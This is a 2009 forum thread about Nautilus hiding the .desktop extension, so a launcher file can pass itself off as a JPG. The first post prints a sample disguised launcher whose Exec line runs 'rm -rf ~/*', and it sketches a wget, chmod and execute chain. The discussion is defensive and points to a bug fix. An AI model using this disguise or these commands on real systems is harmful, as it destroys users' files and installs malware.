---
title: "Security question, Is it possible to make nautilus display .desktop extensions"
date: 2009-04-18
forum: Security
---

### Post by hovzio on 2009-04-18
Well I've been reading a little and I came upon this webpage, 

[http://www.geekzone.co.nz/foobar/6229](http://www.geekzone.co.nz/foobar/6229)

[http://www.geekzone.co.nz/foobar/6229#compact](http://www.geekzone.co.nz/foobar/6229#compact)


This site has a rather catchy heading, "how to write a linux virus in 5 min.." or somthing similar. Well, in my opinion what is described here is not really a virus but definatly an issue that should be at least taken note of by kde and gnome (thunar hase some security measures in place for this issue. In the link Foobar talks about .deskop extensions, to sum it up;

you can name a file foo.JPG.desktop. Nautilus will not show the .desktop ending. This file could look somthing like this..

[Desktop Entry]
Type=Application
Name=rooooble.JPG
Exec=rm -rf ~/* ; lets tear things up ; wget ....
Icon=system-run
X-GNOME-Autostart-enabled=true


Worst case scenario; you download a "picture" and dont see the .desktop ext. in firefox. Nautilus will not show the .desktop extension.the "Exec" command could contain a wget command to some site containing malware or a virus..call it what you will, then the permisions could be changed and the "virus" can be executed.

Exec=wget...../file.com ;chmod 777; ./file

Something like this I guess. The article pretty well describes some evil doings.  The problem is; the file foo.JPG.desktop has a permission set that doese not allow execution, lets say 600!! nevertheless Nautilus will run the commands listed in the file. This is kind of scary I must say, sure if you investigate you will find out that foo.JPG.desktop is indeed not a JPG but it would be cool if nautilus made the user aware of this. Pretty interesting article, good read. 

So, does anyone have a solution for this, can I make nautilus show the .desktop extension. Is there anyway to set up some type of permissions for these files.Any input on the subject is appreciated, thanks :)

EDIT: oh yeah, I know there are no root privledges, but on a single user system with no root account.. you don't really need root to do damage.

---

### Post by cariboo on 2009-04-18
This topic has been discussed to death, have a look at this [thread=1120670]thread[/thread]

Jim

---

### Post by hovzio on 2009-04-18
Wow, I see, just read through the whole thing. I did go searching for things before I posted but didn't come across that one. I was wondering what one could do to display the .desktop extension on the display and I guess there is no option to make them visible. In the above link I was reading there may an option for this sometime in the future. I guess I'll mark this solved as it dose indeed seem to have been discussed in full.Thanks

---

### Post by cariboo on 2009-04-19
I know the problem has been fixed in Jaunty, it may have been backported to Intrepid.

Jim

---

### Post by Yashiro on 2009-04-19
It would be prudent to backport it to Hardy too.

---

### Post by aysiu on 2009-04-19
It looks as if it's a change that will be going upstream:
[https://bugs.launchpad.net/debian/+source/nautilus/+bug/153438](https://bugs.launchpad.net/debian/+source/nautilus/+bug/153438)

---

### Post by doas777 on 2009-04-19
> **aysiu said:**
> It looks as if it's a change that will be going upstream:
[https://bugs.launchpad.net/debian/+source/nautilus/+bug/153438](https://bugs.launchpad.net/debian/+source/nautilus/+bug/153438)

thank you, thats good to see.

---

